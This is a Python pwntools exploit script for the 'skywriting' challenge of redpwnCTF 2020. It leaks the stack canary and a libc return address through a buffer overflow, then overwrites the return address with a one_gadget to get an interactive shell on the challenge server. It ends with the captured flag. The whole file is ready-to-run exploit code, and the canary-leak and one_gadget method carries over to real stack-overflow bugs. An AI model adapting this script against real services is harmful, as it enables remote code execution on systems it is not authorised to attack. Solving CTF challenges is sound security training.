from pwn import *

# config
context(os='linux', arch='i386')

exe = "skywriting"
HOST = "2020.redpwnc.tf"
PORT = 31034
elf = ELF(exe)
libc = ELF('libc.so.6')

conn = remote(HOST, PORT)

gadget = [0x4f2c5, 0x4f322, 0x10a38c]
off_main_ret = 0x21b97


def exploit():
    notflag = "notflag{a_cloud_is_just_someone_elses_computer}\n\x00"

    conn.sendlineafter("sky? \n", "1")
    # canary leak
    log.info("leaking canary...")
    payload = "A" * 0x88
    payload += "B"
    conn.sendafter("shot: ", payload)
    conn.recvuntil("AB")
    canary = b"\x00" + conn.recv(7)
    log.info("canary leaked")
    log.success("canary --> %s\n\n" % hex(u64(canary)))

    # libc leak
    log.info("leaking libc...")
    payload = "A" * 0x97
    payload += "B"
    conn.sendafter("shot: ", payload)
    conn.recvuntil("AB")
    libc_main_ret = u64(conn.recv(6) + b"\x00\x00")
    libc_base = libc_main_ret - off_main_ret
    one_gadget = libc_base + gadget[0]
    log.info("libc_base leaked")
    log.success("libc_base address --> %s\n\n" % hex(libc_base))

    # set canary and one_gadget
    payload = b"\x00" * 0x88
    payload += canary
    payload += b"\x00" * 8
    payload += p64(one_gadget)
    conn.sendafter("shot: ", payload)
    conn.sendlineafter("shot: ", notflag)
    conn.interactive()


if __name__ == "__main__":
    exploit()

# FLAG --> flag{a_cLOud_iS_jUSt_sOmeBodY_eLSes_cOMpUteR}
